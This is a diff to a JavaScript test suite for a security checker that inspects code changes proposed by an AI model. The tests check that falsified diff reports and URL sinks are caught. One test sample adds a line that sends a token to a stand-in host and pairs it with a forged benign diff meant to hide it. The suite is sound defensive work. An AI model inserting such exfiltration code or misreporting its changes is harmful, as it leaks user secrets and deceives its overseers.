@@ -190,7 +190,12 @@ test('independent Security detects URL sinks beyond quoted angles, arrow functio
   ]) {
     assert.equal(inspectModelDiff({ ...input, diff: addition }).status, 'failed', addition);
   }
-  assert.equal(inspectModelDiff({ ...input, diff: '+<span title="one > two">Safe label</span>' }).status, 'passed');
+  const safeActual = '<span title="one > two">Safe label</span>;\n';
+  assert.equal(inspectModelDiff({
+    ...input, actual: safeActual,
+    diff: '@@ -1 +1 @@\n-const items = 1;\n+<span title="one > two">Safe label</span>;\n',
+    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safeActual) }
+  }).status, 'passed');
 });
 
 test('independent Security checks assembled JSX when added diff line omits opening tag', () => {
@@ -226,7 +231,12 @@ test('independent Security rejects URL-bearing props on custom JSX components', 
     report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) } });
   assert.equal(changed.status, 'failed');
   const benign = '<Display label="safe" />';
-  assert.equal(inspectModelDiff({ ...input, diff: '+' + benign }).status, 'passed');
+  const benignActual = benign + '\n';
+  assert.equal(inspectModelDiff({
+    ...input, actual: benignActual,
+    diff: '@@ -1 +1 @@\n-const items = 1;\n+' + benign + '\n',
+    report: { status: 'proposed', sourceHash: hash(input.original), proposedHash: hash(benignActual) }
+  }).status, 'passed');
 });
 
 
@@ -253,4 +263,31 @@ test('independent Security prevents new SDK-backed data access while preserving 
     assert.equal(checked.status, 'failed', addition);
     assert.ok(checked.findings.includes('Potentially unsafe new code'));
   }
+});
+
+test('Security independently binds reported added lines to actual source, including duplicate insertions', () => {
+  const base = 'const status = "ok";\n';
+  const assess = (next, reported) => inspectModelDiff({
+    original: base, actual: next, changedPaths: [MODEL_ALLOWED_PATH], diff: reported,
+    report: { status: 'proposed', sourceHash: hash(base), proposedHash: hash(next) }
+  });
+  const harmless = 'const status = "ready";\n';
+  assert.equal(assess(harmless, '@@ -1 +1 @@\n-const status = "ok";\n+const status = "ready";\n').status, 'passed');
+  const forged = assess(harmless, '@@ -1 +1 @@\n-const status = "ok";\n+const status = "masked";\n');
+  assert.equal(forged.status, 'failed');
+  assert.ok(forged.findings.includes('Reported diff omits newly introduced source lines'));
+
+  const injected = base + 'fetch("https://example.invalid/collect?token=" + token);\n';
+  const omitted = assess(injected, '@@ -1 +1 @@\n-const status = "ok";\n+const status = "ok";\n');
+  assert.equal(omitted.status, 'failed', 'a falsified benign diff cannot conceal source-side transport');
+  assert.ok(omitted.findings.includes('Reported diff omits newly introduced source lines'));
+  assert.ok(omitted.findings.includes('Potentially unsafe new code'));
+
+  const duplicated = base + 'const status = "ok";\n';
+  const noDuplicate = assess(duplicated, '@@ -1 +1 @@\n-const status = "ok";\n+const status = "ok";\n');
+  assert.equal(noDuplicate.status, 'passed', 'a correctly reported duplicate is permitted');
+  assert.ok(noDuplicate.findings.includes('Reported diff omits newly introduced source lines') === false, 'one reported duplicate is covered');
+  const missingDuplicate = assess(duplicated, '@@ -1 +0,0 @@\n');
+  assert.equal(missingDuplicate.status, 'failed');
+  assert.ok(missingDuplicate.findings.includes('Reported diff omits newly introduced source lines'));
 });
